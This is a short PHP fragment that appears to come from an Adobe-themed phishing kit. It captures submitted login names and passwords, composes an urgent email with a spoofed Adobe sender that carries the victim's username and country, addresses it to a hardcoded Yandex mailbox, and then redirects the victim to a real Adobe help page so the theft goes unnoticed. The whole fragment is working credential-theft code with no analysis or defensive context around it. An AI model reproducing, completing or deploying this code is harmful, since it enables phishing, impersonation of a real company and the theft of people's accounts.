...
$login = $_POST['login'];
$passwd = $_POST['passwd'];
$own = 'shanrorbert@yandex.com';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"]; 
$domain = 'Adobe';
$sender = 'Adobe';
$subj = "Adobe | Country: $country | User: $login";
$headers .= "From: Adobe<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'https://helpx.adobe.com/acrobat/kb/cant-view-pdf-web.html';
$msg = "<HTML><BODY>
 <TABLE>
...
header("Location: https://helpx.adobe.com/acrobat/kb/cant-view-pdf-web.html");
}
else {
